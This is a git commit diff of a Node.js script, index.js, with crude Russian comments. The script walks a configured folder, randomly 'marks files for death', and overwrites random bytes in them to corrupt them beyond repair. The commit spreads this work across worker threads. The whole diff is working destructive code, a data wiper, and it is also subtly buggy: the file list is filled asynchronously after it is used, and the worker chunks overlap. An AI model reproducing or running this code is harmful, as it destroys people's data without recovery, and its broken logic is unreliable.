015d1cc0649396fe64bb182c4dd9b4dd5ed881bd
Иван <sav.ivan106@gmail.com>
2023-09-02 14:59:49 +0300

    еюада

--- index.js
+++ index.js
@@ -5102,65 +5102,73 @@
 
 
 const config = require("./config.json");
+
 const fs = require("fs");
+const { Worker, isMainThread, parentPort, workerData } = require("worker_threads");
 
-// ДЕЛАЕТ СПИСОК ВООБЩЕ ВСЕХ ФАЙЛОВ В ПАПКЕ
-let filesList = [];
-fs.readdir(config.path, {recursive:true}, (error, files) => {
-    if (error) {console.log(error);} else {
-        files.forEach(file => {
-            if (!fs.statSync(`${config.path}\\${file}`).isDirectory()) {
-                filesList.push(`${config.path}\\${file}`);
-            }
-        });
+if (isMainThread) {
+    // ДЕЛАЕТ СПИСОК ВООБЩЕ ВСЕХ ФАЙЛОВ В ПАПКЕ
+    let filesList = [];
+    fs.readdir(config.path, {recursive:true}, (error, files) => {
+        if (error) {console.log(error);} else {
+            files.forEach(file => {
+                if (!fs.statSync(`${config.path}\\${file}`).isDirectory()) {
+                    filesList.push(`${config.path}\\${file}`);
+                }
+            });
+        }
+    });
+
+    console.log(`ВСЕ ФАЙЛИКИ - ${filesList.length}`);
+
+    // ПОМЕЧАЕТ ФАЙЛЫ НА СМЕРТЬ
+    MECHENIE_filesList = [];
+    for (let i = 0; i < Math.floor(filesList.length * (config.filesPercentage / 100)); i++) {
+        let file = filesList[Math.floor(Math.random() * filesList.length)];
+        if (!MECHENIE_filesList.includes(file)) {MECHENIE_filesList.push(file);} else {i--;}
     }
-});
 
-console.log(`ВСЕ ФАЙЛИКИ`);
-console.log(filesList);
-console.log(`\n`);
+    console.log(`ФАЙЛИКИ МЕЧЕНЫЕ - ${MECHENIE_filesList.length}`);
+    let partsize = Math.ceil(MECHENIE_filesList.length / config.workers);
+    console.log(`ФАЙЛИКИ МЕЧЕНЫЕ ЧАСТИ - ${partsize}`);
 
-// ПОМЕЧАЕТ ФАЙЛЫ НА СМЕРТЬ
-MECHENIE_filesList = [];
-for (let i = 0; i < Math.floor(filesList.length * (config.filesPercentage / 100)); i++) {
-    let file = filesList[Math.floor(Math.random() * filesList.length)];
-    if (!MECHENIE_filesList.includes(file)) {MECHENIE_filesList.push(file);} else {i--;}
+    for (let i = 0; i < config.workers; i++) {
+        let deathchunk = MECHENIE_filesList.slice(i, i + partsize);
+        const worker = new Worker(__filename, {workerData: deathchunk});
+        worker.on("message", msg => console.log(`РАБ ${worker.threadId} СКАЗАЛ: ${msg}`));
+        worker.on("error", err => console.error(err));
+        worker.on("exit", code => {if (code != 0) {console.log(`РАБ ЗАКОНЧИЛ С КОДОМ ${code}.`)}});
+    }
 }
 
-console.log(`ФАЙЛИКИ МЕЧЕНЫЕ`);
-console.log(MECHENIE_filesList);
-console.log(`\n`);
+else {
+    const data = workerData;
+    parentPort.postMessage(`ПОЛУЧИЛ СПИСОЧЕК РАЗМЕРОМ ${data.length}`);
+    // УБИВАЕТ МЕЧЕНЫЕ ФАЙЛЫ
+    data.forEach(file => {
+        EBALO_BAITOV = [];
+        let buffer = fs.readFileSync(file);
+        let bytes = Math.floor(fs.statSync(file).size * (config.fileDamagePercentage / 100));
+    
+        for (let i = 0; i < bytes; i++) {
+            let byte = Math.floor(Math.random() * fs.statSync(file).size);
+            if (!EBALO_BAITOV.includes(byte)) {
+                EBALO_BAITOV.push(byte);
+    
+                parentPort.postMessage(`ВСЕГО ${Math.round(((data.indexOf(file) + 1) / data.length) * 100)}% | ФАЙЛ ${Math.round(((i + 1) / bytes) * 100)}%`);
+    
+                buffer[byte] = Math.floor(Math.random() * 256)
+            } else {i--;}
+        }
+    
+        fs.writeFileSync(file, buffer);
+    })
+    
+    parentPort.postMessage(`ЗАКОНЧИЛ!!!`);
+}
 
-// УБИВАЕТ МЕЧЕНЫЕ ФАЙЛЫ
-MECHENIE_filesList.forEach(file => {
-    EBALO_BAITOV = [];
-    let buffer = fs.readFileSync(file);
-    let bytes = Math.floor(fs.statSync(file).size * (config.fileDamagePercentage / 100));
 
-    console.log(`СЕЙЧАС ПИЗДИМ ЕГО ---> ${file}`);
-    console.log(`РАЗМЕР ФАЙЛИКА ${fs.statSync(file).size} БАЙТОВ`);
-    console.log(`БУДУ МЕНЯТЬ ${bytes} БАЙТОВ`);
-    //console.log(`ФАЙЛИК ДО ДРОЧКИ`); console.log(buffer.toString('hex'));
 
-    for (let i = 0; i < bytes; i++) {
-        let byte = Math.floor(Math.random() * fs.statSync(file).size);
-        if (!EBALO_BAITOV.includes(byte)) {
-            EBALO_BAITOV.push(byte);
-
-            console.log(`ВСЕГО ${Math.round(((MECHENIE_filesList.indexOf(file) + 1) / MECHENIE_filesList.length) * 100)}% | ФАЙЛ ${Math.round(((i + 1) / bytes) * 100)}% | МЕНЯЮ БАЙТИК НОМЕР ${byte} КОТОРЫЙ ${buffer[byte].toString(16)} (${i + 1}/${bytes})... (ФАЙЛА (${MECHENIE_filesList.indexOf(file) + 1}/${MECHENIE_filesList.length}) ${file})`);
-
-            buffer[byte] = Math.floor(Math.random() * 256)
-        } else {i--;}
-    }
-
-    fs.writeFileSync(file, buffer);
-
-    console.log(`ЗАКОНЧИЛ ЭТОТ ФАЙЛИК!`);
-    //console.log(`ФАЙЛИК ПОСЛЕ ДРОЧКИ`); console.log(buffer.toString('hex'));
-    console.log(`\n`);
-})
-
-console.log(`ЗАКОНЧИЛ!!!`);
 
 // const fs = require('fs');
 // const http = require('http');
